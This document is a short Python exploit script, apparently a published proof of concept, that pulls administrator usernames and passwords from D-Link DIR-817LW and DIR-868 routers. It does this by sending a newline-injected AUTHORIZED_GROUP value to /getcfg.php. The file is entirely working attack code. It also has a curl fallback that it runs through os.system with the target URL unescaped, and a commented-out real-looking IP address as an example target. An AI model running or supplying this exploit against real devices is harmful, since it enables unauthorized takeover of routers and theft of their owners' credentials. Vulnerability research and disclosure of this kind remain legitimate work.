# -*- coding:utf-8 -*-
#get username and passwd from DIR-817LW,DIR-868,,,
# Acknowledgement
# Thanks to the partners who discovered the vulnerability together：
# Wei Xie
# Zhen-hua Wang
# En-Ze Wang

import requests, os
import sys
from lxml import etree
try:
    from urllib.parse import urljoin
except:
    from urlparse import urljoin
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# url = 'http://58.237.50.225/'
if len(sys.argv)<2:
    print("Usage: python27 getCred.py http://127.0.0.1")
    exit()
else:
    url = sys.argv[1]
    
print("Exploit start...")
try:
    res = requests.post(urljoin(url,'/getcfg.php'),data={"SERVICES":"DEVICE.ACCOUNT","AUTHORIZED_GROUP":"1\n"})
    # print(res.content)
except:
    print("exploit fail...")
    print("you can try this command:")
    print("curl -k -d \"SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a\" {}getcfg.php".format(url))
    print(os.system("curl -k -d \"SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a\" {}getcfg.php".format(url)))
    exit()

if 'Not authorized' in res.content:
    print("authorize fail..")
    exit()
elif "BAD REQUEST" in res.content:
    print("BAD REQUEST, unsupported HTTP request")

tree = etree.fromstring(res.content)
accounts = tree.xpath("/postxml/module/device/account/entry")
# print accounts
for acc in accounts:
    name = acc.findtext("name","")
    passwd = acc.findtext("password","")
    print("name: %s" % name)
    print("password: %s" % passwd)

